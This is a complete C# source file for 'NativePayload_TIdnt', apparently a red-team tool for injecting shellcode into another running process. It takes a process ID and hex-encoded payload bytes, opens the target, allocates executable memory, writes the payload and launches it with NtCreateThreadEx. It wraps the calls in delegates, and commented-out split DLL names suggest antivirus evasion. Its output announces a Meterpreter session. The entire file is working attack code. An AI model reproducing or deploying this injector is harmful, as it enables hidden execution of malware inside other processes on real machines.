using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;


namespace NativePayload_TIdnt
{
    class Program
    {

        public class DelCLSInvoke
        {
            [Flags]
            public enum ProcessAccessFlags : uint
            {
                Terminate = 0x00000001,
                CreateThread = 0x00000002,
                VMOperation = 0x00000008,
                VMRead = 0x00000010,
                VMWrite = 0x00000020,
                DupHandle = 0x00000040,
                SetInformation = 0x00000200,
                QueryInformation = 0x00000400,
                Synchronize = 0x00100000,
                All = 0x001F0FFF
            }

            [Flags]
            public enum AllocationType
            {
                Commit = 0x00001000,
                Reserve = 0x00002000,
                Decommit = 0x00004000,
                Release = 0x00008000,
                Reset = 0x00080000,
                TopDown = 0x00100000,
                WriteWatch = 0x00200000,
                Physical = 0x00400000,
                LargePages = 0x20000000
            }

            [Flags]
            public enum MemoryProtection
            {
                NoAccess = 0x0001,
                ReadOnly = 0x0002,
                ReadWrite = 0x0004,
                WriteCopy = 0x0008,
                Execute = 0x0010,
                ExecuteRead = 0x0020,
                ExecuteReadWrite = 0x0040,
                ExecuteWriteCopy = 0x0080,
                GuardModifierflag = 0x0100,
                NoCacheModifierflag = 0x0200,
                WriteCombineModifierflag = 0x0400
            }
            // [DllImport("ke"+"rne"+"l"+"32.dll")]
            [DllImport("kernelbase.dll")]

            public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, int dwProcessId);

            [DllImport("kernelbase.dll")]
            public static extern bool CloseHandle(IntPtr hObject);

            // [DllImport("ke" + "rne" + "l" + "32.dll")]
            [DllImport("kernelbase.dll")]

            public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

            // [DllImport("ke" + "rne" + "l" + "32.d"+"ll")]
            [DllImport("kernelbase.dll")]
            public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

            [DllImport("ntdll.dll")]
            public static extern uint NtCreateThreadEx(out IntPtr hThread, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle,
                IntPtr lpStartAddress, IntPtr lpParameter, bool CreateSuspended, uint StackZeroBits,
                uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr lpBytesBuffer);
      

            public static IntPtr _Step1_(int XprocID, string Xcode)
            {
                string[] X = Xcode.Split(',');
                int Injection_to_PID = XprocID;
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.WriteLine("[!] Injection Started Time {0}", DateTime.Now.ToString());
                Console.WriteLine("[!] Payload Length {0}", X.Length.ToString());
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.Write("[>] Injecting Meterpreter Payload to ");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.Write("{0}:{1} ", Process.GetProcessById(Injection_to_PID).ProcessName, Process.GetProcessById(Injection_to_PID).Id.ToString());
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.Write("Process");
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.WriteLine();
                Console.WriteLine("[!] Thread Injection Done Time {0}", DateTime.Now.ToString());
                Console.WriteLine();


                byte[] Xpayload = new byte[X.Length];

                for (int i = 0; i < X.Length;)
                {
                    Xpayload[i] = Convert.ToByte(X[i], 16);
                    i++;
                }
                //  Console.WriteLine("[" + System.DateTime.Now.ToString() + "] Delay Detected.");

                IntPtr x = OpenProcess(ProcessAccessFlags.All, false, Injection_to_PID);
                return x;
            }
            public static IntPtr _Step2_(IntPtr a, int p)
            {
                IntPtr x = VirtualAllocEx(a, IntPtr.Zero, (uint)p, AllocationType.Commit, MemoryProtection.ExecuteReadWrite);
                return x;
            }
            public static bool _Step3_(IntPtr H, IntPtr P, byte[] pay)
            {
                UIntPtr BS = UIntPtr.Zero;
                if (WriteProcessMemory(H, P, pay, (uint)pay.Length, out BS))
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
            public static IntPtr _Step4_(IntPtr H, IntPtr HA)
            {
                uint x = 0;

                IntPtr ops = IntPtr.Zero;
                uint opsNT = NtCreateThreadEx(out ops, 0x1FFFFF, IntPtr.Zero, H, HA, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
                /// close
                // CloseHandle((IntPtr)opsNT);
                CloseHandle(HA);
                return (IntPtr)opsNT;
                // return cde;
            }
        }
        public delegate IntPtr Mydels1and2(int a, string b);
        public delegate IntPtr Mydels2and3(IntPtr a, int p);
        public delegate bool Mydels3and4(IntPtr H, IntPtr P, byte[] pay);
        public delegate IntPtr Mydels4and4(IntPtr H, IntPtr HA);
        static void Main(string[] args)
        {
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("NativePayload_TIdnt , Published by Damon Mohammadbagher , May 2020");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("NativePayload_TIdnt Thread Injection into Target Process + C# Delegation");
            Console.WriteLine();
            // Console.ReadKey();
            string[] X = args[1].Split(',');
            int Injection_to_PID = (Convert.ToInt32(args[0]));

            byte[] Xpayload = new byte[X.Length];

            for (int i = 0; i < X.Length;)
            {
                Xpayload[i] = Convert.ToByte(X[i], 16);
                i++;
            }
          
            Mydels1and2 delstep1 = new Mydels1and2(DelCLSInvoke._Step1_);
            Mydels2and3 delstep2 = new Mydels2and3(DelCLSInvoke._Step2_);
            Mydels3and4 delstep3 = new Mydels3and4(DelCLSInvoke._Step3_);
            Mydels4and4 delstep4 = new Mydels4and4(DelCLSInvoke._Step4_);
            Console.WriteLine();
            IntPtr H = delstep1.Invoke(Convert.ToInt32(args[0]), args[1]);
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.Write("Step1 Delegate.Invoke(");
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write("{0}", H.ToString("X8"));
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.Write(") Intptr Done.");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write(" [API::OpenProcess]");
            Console.WriteLine();

            IntPtr HA = delstep2.Invoke(H, Xpayload.Length);
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.Write("Step2 Delegate.Invoke(");
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write("{0}", HA.ToString("X8"));
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.Write(") Intptr Done.");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write(" [API::VirtualAllocEx]");
            Console.WriteLine();


            if (delstep3.Invoke(H, HA, Xpayload))
            {
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.Write("Step3 Delegate.Invoke(");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.Write("{0}0000000", 0.ToString());
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.Write(") true ;D Done.");
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write(" [API::WriteProcessMemory]");
                Console.WriteLine();

                IntPtr f = delstep4.Invoke(H, HA);
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.Write("Step4 Delegate.Invoke(");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.Write("{0}", f.ToString("X8"));
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.Write(") Intptr Done.");
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write(" [API::NtCreateThreadEx]");
                Console.WriteLine();
                Console.WriteLine();

                Console.ForegroundColor = ConsoleColor.Gray;
                Console.WriteLine("Bingo Meterpreter Session by Thread Injection Method + Delegations ;)");
                Console.WriteLine();
            }
     
        }
    }
}
